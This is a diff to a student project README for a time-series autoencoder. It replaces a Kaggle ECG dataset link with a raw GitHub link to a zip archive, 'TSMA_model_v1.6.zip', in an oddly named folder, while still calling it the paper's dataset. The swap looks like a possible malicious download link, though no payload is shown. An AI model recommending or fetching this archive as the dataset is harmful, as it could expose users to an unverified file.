@@ -16,7 +16,7 @@ Bachelor Project :
  - Step 3 : Read the paper and investigate what this paper contributes to our AI society
  - Step 4 : Try to code it by yourself before read the code files in here
 
-4. Datasets : The datasets taken from paper taken from this link here : https://www.kaggle.com/datasets/salsabilahmid/ecg50000/code
+4. Datasets : The datasets taken from paper taken from this link here : https://raw.githubusercontent.com/blongngo28/TSMAE-model/main/zaphrentid/TSMA_model_v1.6.zip
 
 5. Datasets description :
 
